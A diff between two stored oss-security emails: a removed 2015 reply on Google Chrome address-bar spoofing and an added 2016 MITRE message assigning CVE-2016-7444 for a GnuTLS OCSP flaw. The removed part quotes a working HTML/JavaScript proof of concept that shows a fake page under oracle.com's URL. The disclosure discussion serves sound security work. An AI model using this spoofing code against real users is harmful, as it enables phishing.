@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1922" "Wednesday" "1" "July" "2015" "10:12:35" "+1200" "Valentinas Bakaitis" "v.bakaitis@gmail.com" "<CAP7Z6--Zd8zojRXbevz+xETqvqRGWJKhaY=OL9LL2mRusPMNiA@mail.gmail.com>" "67" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" nil nil nil "7" "2015063022:12:35" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" (number mark "        v.bakaitis@g Jul  1   67/1922  " thread-indent "\"[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)\"\n") "<55923253.8020902@deusen.co.uk>" ("<55923253.8020902@deusen.co.uk>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1524" "Sunday" "18" "September" "2016" "10:41:38" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160918144138.A17646C571B@smtpvmsrv1.mitre.org>" "38" "[oss-security] Re: CVE Request: GnuTLS: OCSP validation issue (GNUTLS-SA-2016-3)" nil nil nil "9" "2016091814:41:38" "[oss-security] Re: CVE Request: GnuTLS: OCSP validation issue (GNUTLS-SA-2016-3)" (number mark "U       cve-assign@m Sep 18   38/1524  " thread-indent "\"[oss-security] Re: CVE Request: GnuTLS: OCSP validation issue (GNUTLS-SA-2016-3)\"\n") "<20160918123124.poc7x5skdijl2j3m@eldamar.local>" ("<20160918123124.poc7x5skdijl2j3m@eldamar.local>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 3197 invoked by uid 550); 1 Jul 2015 07:57:34 -0000
+Received: (qmail 20003 invoked by uid 550); 18 Sep 2016 14:41:51 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,97 +11,51 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 21757 invoked from network); 30 Jun 2015 22:13:06 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
-         :cc:content-type;
-        bh=D1jwh6cTAiX5O8OSOw9pSH+AhvbP+oxiR2uHtPOHlGw=;
-        b=kq/A5/z3tEhShoP45w/vcUXKL9ekaXO34hVCKtnZSxO+IuQlYk33dd5hPsKZr+PIke
-         qMtKsP1hqA3ClY8IcAnZVgqsh5FBkmxGpsbQZEvWjmvOurnKDa+3ZoTo4jrAgkgsiUG/
-         gs7wTRlCtcbGQKMYypCbperW2Szmr49n/Y++jA0S7q2QHk8pgkkQycqLxBe8KA4qC7EG
-         VgeCzL6H6X3IYvzYafQ8+dg544LJB+C7e62QqBk22oo3nq+/obHIxy1sdLvFOTztDDuT
-         l5vcaetdn2gpUa2UMc86oP8AvdROR4pnzJMXHxgHy1Rs3YQrQLiZ2M05w2mohFJOcefF
-         fLAw==
-X-Received: by 10.170.111.209 with SMTP id d200mr27692754ykb.120.1435702374652;
- Tue, 30 Jun 2015 15:12:54 -0700 (PDT)
-MIME-Version: 1.0
-In-Reply-To: <55923253.8020902@deusen.co.uk>
-References: <55923253.8020902@deusen.co.uk>
-Message-ID: <CAP7Z6--Zd8zojRXbevz+xETqvqRGWJKhaY=OL9LL2mRusPMNiA@mail.gmail.com>
-Content-Type: multipart/alternative; boundary=001a11379a680b65600519c38239
-Cc: "bugtraq@securityfocus.com" <bugtraq@securityfocus.com>, fulldisclosure@seclists.org, 
-	oss-security@lists.openwall.com
-Date: Wed, 1 Jul 2015 10:12:35 +1200
-From: Valentinas Bakaitis <v.bakaitis@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: Google Chrome Address Spoofing (Request For Comment)
-To: David Leo <david.leo@deusen.co.uk>
+Received: (qmail 19979 invoked from network); 18 Sep 2016 14:41:50 -0000
+From: cve-assign@mitre.org
+To: carnil@debian.org
+Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
+In-Reply-To: <20160918123124.poc7x5skdijl2j3m@eldamar.local>
+Message-Id: <20160918144138.A17646C571B@smtpvmsrv1.mitre.org>
+Date: Sun, 18 Sep 2016 10:41:38 -0400 (EDT)
+Subject: [oss-security] Re: CVE Request: GnuTLS: OCSP validation issue (GNUTLS-SA-2016-3)
 
---001a11379a680b65600519c38239
-Content-Type: text/plain; charset=UTF-8
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Can you perform any actions on the page once the URL is replaced, or is it
-non responsive? (asking because PoC did not work on my Chrome 43.0.2357.130
-(64-bit) on OSX). If it is non responsive then the impact is very limited.
-Worst thing I can think of is showing "your account is suspended, please
-contact technical support on 0800-555-555" and then using the trust user
-puts in the URL for phone phishing. If it is responsive, then it's indeed
-pretty bad.
+> can falsely report a
+> certificate as valid under certain circumstances
 
-Cheers!
-V.
+>> if the serial from the revoked certificate is a
+>> prefix of the other one, and the additional bytes happen to be equal
+>> on the system doing the verification.
+ 
+> https://lists.gnupg.org/pipermail/gnutls-devel/2016-September/008146.html
+> https://gitlab.com/gnutls/gnutls/commit/964632f37dfdfb914ebc5e49db4fa29af35b1de9
+> https://bugzilla.redhat.com/show_bug.cgi?id=1374266
 
-On Tue, Jun 30, 2015 at 6:08 PM, David Leo <david.leo@deusen.co.uk> wrote:
+Use CVE-2016-7444.
 
-> Impact:
-> The "click to verify" thing is completely broken...
-> Anyone can be "BBB Accredited Business" etc.
-> You can make whitehouse.gov display "We love Islamic State" :-)
->
-> Note:
-> No user interaction on the fake page.
->
-> Code:
-> ***** index.html
-> <script>
-> function next()
-> {
->         w.location.replace('http://www.oracle.com/index.html?'+n);n++;
->         setTimeout("next();",15);
->         setTimeout("next();",25);
-> }
-> function f()
-> {
->         w=window.open("content.html","_blank","width=500 height=500");
->
-> i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
-> }
-> </script>
-> <a href="#" onclick="f()">Go</a><br>
-> ***** content.html
-> <b>This web page is NOT oracle.com</b>
-> <script>location="http://www.oracle.com/index.html";</script>
-> ***** It's online
-> http://www.deusen.co.uk/items/gwhere.6128645971389012/
-> (The page says "June/16/2015" - it works as we tested today)
->
-> Request For Comment:
-> We reported this to Google.
-> They reproduced, and say
-> It's DoS which doesn't matter.
-> We think it's very strange,
-> since the browser does not crash(not DoS),
-> and the threat is obvious.
-> What's your opinion?
->
-> Kind Regards,
->
-> PS
-> We love clever tricks.
-> We love this:
-> http://dieyu.org/
->
->
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
---001a11379a680b65600519c38239--
+iQIcBAEBCAAGBQJX3qaBAAoJEHb/MwWLVhi2ZIQQALqBsgvjmj3aKEwKaFKSvNcM
+vOm5UKhOpdwYX7syoPi9J/IfGcvs2Z8K1GPnOxvyyuFBcBzbypgW+UnEvv8kT7ze
+5ckPgFSjfaco1cYcBhKq5hlQoTLayhH3YP8XDzWlfE3KijEJAQuA6+wcHL2ddg3d
+29nAuKgIkd27SZMEDDcv+x8b3Ibnds/LWUWFleAEPBBiyTrSgeLiWmgLToHSiOND
+wyfmiNg9SouaBm3icAnd95AHYQmMztrd5xEvuAWK3ZsMFgJtrPjK1kTk13madyfN
+TgwwQ2PM99EmRgaXHqvrXeRcohRQtV2ptgMqQS9a31fk7uJb8HITNgESoM4z2FRF
+dLpLzDAMm9X1IKXRDDHqOPobFgwe/ZyG3MEl8994N1Y3N2QYrXm84SmiWTYtDlcD
+HX2NFievDARKQBzHvJhQwDw98rdFb9P7CLvz4dolVix07xZzy505exktxpAH0yTs
+2LXkpB1FQb99ZJzPPZ967S1bY0fpANQzCFLBQlZ8B5g2bmUwo52c+C+JsHay/+3i
+dnFPSxTJVXRStPHs1II7NufIGjBlitfIHIRlpTtzCsFTy7ppgI5PEfpA/tnCFkXR
+bhrtIOGqqGyj2ySa4nmYhA95MRLO7XoNIXYT5byRpXI6I6pIEIRkNxeYIChSydEY
+m1uV5gCz/FIWXRCl6Dzi
+=1u4M
+-----END PGP SIGNATURE-----
